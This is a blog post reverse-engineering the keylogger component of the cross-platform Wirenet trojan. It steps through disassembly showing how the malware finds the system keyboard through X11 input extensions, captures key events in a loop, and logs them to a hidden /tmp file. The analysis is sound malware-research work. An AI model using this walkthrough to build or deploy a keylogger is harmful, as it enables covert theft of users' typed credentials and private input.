---
layout: post
title: Analysis of Wirenet
date: 2017-07-04
---
<p class="subtitle">Reverse engineering a cross-platform banking trojan</p>
<!--moore-->
<!-- permalink: /:title -->

### Introduction

I came across an [article](https://securityintelligence.com/news/java-malware-becomes-a-cross-platform-threat/) about an attack that leveraged phishing in order to drop Java malware on victims' machines. This reminded of *Wirenet* a cross-platform malware, that really made me wonder whether there was a link between the two.

### Analysis

<p style="text-align: center;">For the sake of brevity I'll will only showcase the process of decompiling the keylogger</p>  

<!-- <pre style="background-color: #f5f5f5;padding-left: 1rem;padding-right: 1rem;padding-top: 1rem !important;padding-bottom: 1rem;important;line-height: 1.1rem;font-family: 'Inconsolata', Courier, monospace;font-size: 0.9rem;margin-top: 0rem;margin-bottom: 1.8rem;"> -->
```assembly
void *cpStartKeyLogger(void *)

1	sub     esp, 0Ch
2	push    0               ; char *
3	call    ds:_XOpenDisplay
4	add     esp, 10h
5	test    eax, eax
6	mov     ebx, eax
7	jnz     short State_2
```

Line 2 - 3 call _XOpenDisplay_ which establishes a connection to the X server, line 4 - 7 do some error checking and jump to _loc\_8055532_ in case _XOpenDisplay_ returns a non-zero value. Otherwise a variable called KeyLoggerState is set to 2

```assembly
1	mov     KeyLoggerState, 2
2	jmp     loc_80557BA
```

Next this part is executed

```assembly
1	sub     esp, 0Ch
2	lea     eax, [esp+118h+var_28]
3	push    eax             ; int *
4	lea     eax, [esp+11Ch+var_2C]
5	push    eax             ; int *
6	lea     eax, [esp+120h+var_24]
7	push    eax             ; int *
8	push    offset aXinputextensio ; "XInputExtension"
9	push    ebx             ; Display *
10	call    ds:_XQueryExtension
11	add     esp, 20h
12	test    eax, eax
13	jnz     short loc_805556F
```

Line 2 - 4 - 6 load the addresses of the variables into eax, so that line 3 - 5 - 7 can push those values onto the stack and call _XQueryExtension_. _XQueryExtension_ determines if the named extension is present. Line 11 cleans up the stack, line 12 - 13 check if _XInputExtension_ was present.  
If the function fails KeyLoggerState is set to 3

```assembly
1	mov     KeyLoggerState, 3
2	jmp     loc_8
```

The following part starts off with a with a comparsion between _var\_20_ and _ebp_

```assembly
1	cmp     ebp, [esp+10Ch+var_20]
2	jl      short  loc_805558B
```

The image shows pretty clearly that the previous two lines are part of a loop![cmp loop](/assets/img/ida_cmp_loop.png)

<!-- In this part the malware iterates over the list of input devices connected to the system, looking for one containing either `AT` or `System keyboard`. -->
Every reverse engineer races against mental fatigue, and it is fundamental to be able to dissect the unimportant pieces from the relevant ones. Having said that, I omitted some parts as they were not as important to understand the overall implementation of the keylogger.

```assembly
1	push    offset aAt      ; "AT"
2	push    edx             ; haystack
3	mov     [esp+11Ch+haystack], edx
4	call    _strstr
```
This part is pretty simple, a string _AT_ is passed to _\_strstr_ along with a variable called _haystack_, looking for the first occurence of the former in the latter. To put it simply, the call looks something like this:

```
1	void _strstr (void *haystack, void *needle) {
2		return strstr(*haystack, *needle);
3	}
```

Line 5 cleans up the stack, line 6 stores the haystack in edx and line 7 checks _\_strstr_'s return value. If it is zero execution jumps to _loc\_80555D2_ which simply ends the loop by incrementing the counter.

```assembly
5	add     esp, 10h
6	mov     edx, [esp+10Ch+haystack]
7	test    eax, eax
8	jnz     short loc_80555D0
```

```assembly
1	inc     ebp
2	add     edi, 18h
```

If an occurence is found there's another search, this time using _System keyboard_ as needle.

```
11	push    offset aSystemKeyboard ; "System keyboard"
12	push    edx             ; haystack
13	call    _strstr
14	add     esp, 10h
15	test    eax, eax
16	jz      short loc_80555D2
```

The interesting part of this branch is over, it is worth however mentioning that under some conditions a variable called _KeyLoggerState_ is set to 4.  
<br>
Let's go up the abstraction ladder and let's ask ourselves what happens if the previous check happens to be passed.
Here lies the heart of the keylogger:

```assembly
1	push    dword ptr [esi] ; _DWORD
2	push    ebx             ; _DWORD
3	call    ds:_XOpenDevice
4	add     esp, 10h
5	test    eax, eax
6	jz      loc_80
```
As the name suggests, after finding the device rappresenting the system keyboard the malware tries to open it with _XOpenDevice_ and return a _XDevice_ structure which are defined as follows
```
1	XDevice *XOpenDevice ( Display *display, XID device_id )
2	typedef struct {
3		XID device_id;
4		int num_classes;
5		XInputClassInfo *classes;
6	} XDevice;
```
There are two conditions two branches that set _KeyLoggerState_ to 5

* The function fails
```assembly
1	mov     KeyLoggerState, 5
```
* The field _device\_id_ (offset _[eax+4]_) is zero
```assembly
1	mov     edx, [eax+4]
2	test    edx, edx
3	mov     [esp+10Ch+var_FC], edx
4	jle     State_5
```

The executions continues to the next function. I won't go over in detail to how variables are passed to the function as it would be somewhat redundant

```assembly
1	push    esi             ; _DWORD
2	lea     eax, [esp+110h+var_48]
3	push    eax             ; _DWORD
4	push    [esp+114h+var_F4] ; _DWORD
5	mov     dword_805873C, ecx
6	push    ebx             ; _DWORD
7	call    ds:_XSelectExtensionEvent
8	add     esp, 10h
9	test    eax, eax
10	jnz     State_5
11	test    esi, esi         ; event_count
12	jz      State_5
```
_XSelectExtensionEvent_ selects an extension event and is defined as follows
```
XSelectExtensionEvent ( Display *display,
                       Window w,
                       XEventClass *event_list,
                       int event_count )
```

The _KeyLoggerState_ variable is now set to 0
```assembly
1	mov     KeyLoggerState, 0
2	lea     edi, [esp+10Ch+var_E4]
3	lea     esi, [esp+10Ch+v
```
At this point, we found the system keyboard device, opened a handle and did something else lol  
All is set and the malware can start logging keystrokes

```assembly
1	loc_80556D9:
2	push    eax
3	push    eax
4	push    edi             ; XEvent *
5	push    ebx             ; Display *
6	call    ds:_XNextEvent
7	mov     eax, dword ptr [esp+11Ch+var_E4]
8	add     esp, 10h
9	cmp     eax, dword_805873C
10	jnz     short loc_80556D9
```

>The XNextEvent function copies the first event from the event queue into the specified XEvent structure and then removes it from the queue. If the event queue is empty, XNextEvent flushes the output buffer and blocks until an event is received.

```
int XNextEvent ( Display *display, XEvent *event_return )
```
_XNextEvent_ is defined as follows
```
1	typedef struct {
2	
3		int type;
4	
5		/* KeyPress or KeyRelease */
6	
7		unsigned long serial;
8	
9		/* # of last request processed by server */
[...]
14	
15		Display *display;
16	
17		/* Display the event was read from */
[...]
54	} XKeyEvent;
```

After an event occures and _XNextEvent_ gets executed the following instructions fill a _XKeyEvent_ structure and pass it to _LogKey_. Line 34 jumps to the previous code snippet (a never ending loop).

```assembly
1	mov     [esp+10Ch+var_84.type], eax
2	mov     eax, dword ptr [esp+10Ch+var_E4+4]
3	mov     [esp+10Ch+var_84.serial], eax
4	mov     eax, dword ptr [esp+10Ch+var_E4+0Ch]
5	mov     [esp+10Ch+var_84.display], eax
[...]
30	push    ebx             ; Display *
31	push    esi             ; XKeyEvent *
32	call    LogKey
33	add     esp, 10h
34	jmp     loc_80556D9
```

The _LogKey_ function saves intercepted keystrokes to _/tmp/.m8.dat_.

<!-- This is what happens right after `KeyLoggerState` is set to 5
```assembly
1	push    0               ; int
2	push    ebx             ; Display *
3	call    ds:_XSync
4	mov     [esp+11Ch+var_11C], ebx ; Display *
5	call    ds:_XCloseDisplay
6	add     esp, 1
```
-->

### Conclusion

The implementation of the keylogger is quite simple and lean, making it easy replicate it at the cost of its ability to conceal itself, which is completly absent.  
The decompiled source code can be found [here](https://github.com/shxdow/wirenet-analysis).

<!-- **Obstacles. barriers. Dead ends. They can end your journey or they can cause you to change directions.**

**No matter what you do in life there will always be something standing in the way of you reaching your goal.** Money, knowledge, location, connections and timing, they can all influence how easy or hard it is to do what you want to do. The question is: what do you do when you’re faced with an obstacle?

**Do you quit or do you change direction?**

**You’ve already decided to build a wall, don’t be stopped by a dead end and change directions to keep on building.** I’ve already started to build a blog, if I lose interest in a topic then I can write about something else. When you reach a barrier I encourage you to change directions and find another way to reach your goal. -->
